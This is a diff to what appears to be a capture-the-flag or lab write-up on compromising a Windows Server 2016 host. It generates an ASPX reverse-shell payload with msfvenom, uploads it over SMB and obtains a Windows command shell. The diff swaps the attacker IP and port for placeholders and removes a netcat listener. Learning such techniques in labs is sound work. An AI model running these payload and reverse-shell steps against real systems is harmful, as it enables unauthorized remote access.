@@ -179,7 +179,7 @@ Things we need to know/realize
 	Windows Server 2016 uses x64 architecture
 with that in mind 
 
-# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.1.12 LPORT=53 -f aspx -o rshell.aspx
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx -o rshell.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -194,9 +194,7 @@ smb: \> put rshell.aspx
 putting file rshell.aspx as \rshell.aspx (7.3 kb/s) (average 7.3 kb/s)
 smb: \>
 
-# nc -nlvp 53
-listening on [any] 53 ...
-connect to [10.13.1.12] from (UNKNOWN) [10.10.74.19] 49798
+
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
